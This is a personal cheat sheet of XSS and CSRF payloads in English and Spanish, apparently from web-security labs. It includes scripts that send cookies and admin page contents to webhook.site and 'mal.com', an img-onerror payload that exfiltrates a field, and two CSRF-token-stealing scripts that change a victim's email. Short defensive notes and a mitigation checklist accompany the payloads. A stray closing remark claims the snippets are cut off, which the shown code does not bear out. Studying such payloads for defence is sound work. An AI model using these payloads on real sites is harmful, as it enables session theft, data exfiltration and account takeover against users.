# Scripts XSS ( included XSS + CSRF)

---

### Snippets (referencia)

- **Tricking the admin**
    
    ```jsx
    <script>
    fetch('/poem/?username=admin', {credentials: 'include'})
    .then(htmladmin => htmladmin.text())
    .then(sendhtmladmintext => {
        fetch('https://webhook.site/baa4d6f4-b445-4d60-9d17-2c9580af3961', {
            method: 'POST',
            mode: 'no-cors',
            body: sendhtmladmintext
        })
    });
    </script>
    ```
    
**For defense**
    
    - What it indicates: Use of `fetch` with `credentials: ‘include’` suggests access to authenticated resources from an unintended context.
    - What to review: unprotected sensitive endpoints, origin checks, and data exposure in HTML.
    - Typical mitigation: output encoding + CSP + validate origin + reduce sensitive data in responses.
- **Stealing cookies**
    
    ```jsx
    <script>fetch("[https://webhook.site/f61526b5-cc7f-4a8e-9e8b-bc022e532818?cookie=](https://webhook.site/f61526b5-cc7f-4a8e-9e8b-bc022e532818?cookie=)" + document.cookie)</script>
    ```
    
    **For defense**    
    - What it indicates: exfiltration via request to external domain.
    - What to check: cookies with flags (`HttpOnly`, `Secure`, `SameSite`), CSP `connect-src`, and presence of XSS.
    - Typical mitigation: `HttpOnly` (prevents reading by JS), `SameSite`, strict CSP, sanitization/encoding, and WAF if applicable.
- **Conseguir componente url**
    
    ```jsx
    <script>
    fetch('http://real.com/poem?username=admin')
    .then(r => r.text())  // Corregido: debe ser r.text() no r.text
    .then(t => {
        fetch('http://mal.com/?flag=' + encodeURIComponent(t))
    })
    </script>
    ```
    
    **Para defensa**
    
    - Qué indica: intento de leer/usar información de rutas, parámetros o recursos internos.
    - Qué revisar: validación de parámetros, autorización en cada endpoint, y *logging* de accesos anómalos.
    - Mitigación típica: control de acceso servidor-side y validación estricta de inputs.
- **Robar un componente URL por nombre (CSRF), cambiar email**
    
    ```jsx
    <script>
    window.addEventListener('DOMContentLoaded', function(){
        // 1. Obtiene el token CSRF de la página
        var token = document.getElementsByName('csrf')[0].value;
        
        // 2. Crea un objeto FormData para enviar datos: el tocken CSRF que hemos robado y el email falso que queremos remplazar
        var data = new FormData();
        data.append('csrf', token);
        data.append('email', 'evil@hacker.net');
        
        // 3. Envía la petición para cambiar el email
        fetch('/my-account/change-email', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });
    });
    </script>
    ```
    
    **Para defensa**
    
    - Qué indica: intento de acción “state-changing” (cambio de email) que depende de CSRF.
    - Qué revisar: protección CSRF real (token correcto y validado), `SameSite` cookies, y verificación de `Origin/Referer`.
    - Mitigación típica: tokens anti-CSRF por petición + `SameSite=Lax/Strict` + `Origin` checks.
- **Robar un componente URL por nombre (CSRF), cambiar email V2**
    
    ```jsx
    <script>
    // 1. Crea una solicitud AJAX para obtener la página de la cuenta
    var req = new XMLHttpRequest();
    
    // 2. Define la función que manejará la respuesta
    req.onload = handleResponse;
    
    // 3. Configura la solicitud GET a '/my-account'
    req.open('get', '/my-account', true);
    req.send();
    
    // 5. Función que procesa la respuesta
    function handleResponse() {
        // 6. Extrae el token CSRF usando una expresión regular y busca: name="csrf" value="TOKEN_AQUI"
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        
        // 7. Crea una nueva solicitud para cambiar el email
        var changeReq = new XMLHttpRequest();
        
        // 8. Configura la solicitud POST a '/my-account/change-email'
        changeReq.open('post', '/my-account/change-email', true);
        
        // 9. Envía el token CSRF robado junto con el nuevo email
        changeReq.send('csrf=' + token + '&email=test@test.com')
    };
    </script>
    ```
    
- **Función rara**
    
    ```jsx
    <img src=x onerror='
        // 1. Crear una solicitud AJAX
        var x = new XMLHttpRequest();
        
        // 2. Configurar solicitud GET a la página del admin
        x.open("GET", "/poem/?username=admin");
        
        // 3. Definir qué hacer cuando llegue la respuesta
        x.onload = function() {
            // 4. Obtener el texto de la respuesta
            var h = this.responseText;
            
            // 5. Buscar la cadena "aboutme" en el HTML
            var i = h.indexOf("aboutme");
            
            // 6. Si encuentra "aboutme"
            if(i >= 0) {
                // 7. Buscar "value=" después de "aboutme"
                var v = h.indexOf("value=", i);
                
                // 8. Si encuentra "value="
                if(v > 0) {
                    // 9. Obtener el carácter delimitador (comilla o apóstrofe)
                    // Esto es para encontrar value="algo" o value='algo'
                    var q = h.charAt(v + 6);
                    
                    // 10. Buscar el delimitador de cierre
                    var e = h.indexOf(q, v + 7);
                    
                    // 11. Extraer el valor entre los delimitadores
                    var f = h.substring(v + 7, e);
                    
                    // 12. Exfiltrar los datos usando una imagen
                    // Esto evita restricciones CORS
                    new Image().src = "https://webhook.site/d990828d-450d-4f6a-b152-f9a8b96ba4ca?flag=" + encodeURIComponent(f);
                }
            }
        };
        
        x.send()'>
    ```
    
    **Para defensa**
    
    - Qué indica: patrón típico de XSS que lee una respuesta interna y extrae valores del HTML.
    - Qué revisar: puntos de inyección (inputs reflejados/almacenados), templates sin escaping, y CSP.
    - Mitigación típica: escaping contextual, sanitización, CSP (con `nonce`/`strict-dynamic` si procede), y evitar HTML sensible en DOM.

---

### Checklist rápido (defensivo)

- [ ]  ¿Cookies sensibles llevan `HttpOnly`, `Secure` y `SameSite`?
- [ ]  ¿Endpoints con cambios de estado validan CSRF y `Origin/Referer`?
- [ ]  ¿Hay CSP activa y restrictiva (script-src / connect-src)?
- [ ]  ¿Se hace *escaping* contextual en HTML/atributos/JS/URL?
- [ ]  ¿Hay alertas/logs para requests a dominios externos sospechosos desde el navegador?

### Pendiente para dejarlo perfecto

- Ahora mismo varios snippets están **cortados** (strings o `fetch('` sin cerrar). Si pegas la versión completa, los dejo consistentes y con notas más específicas por snippet.
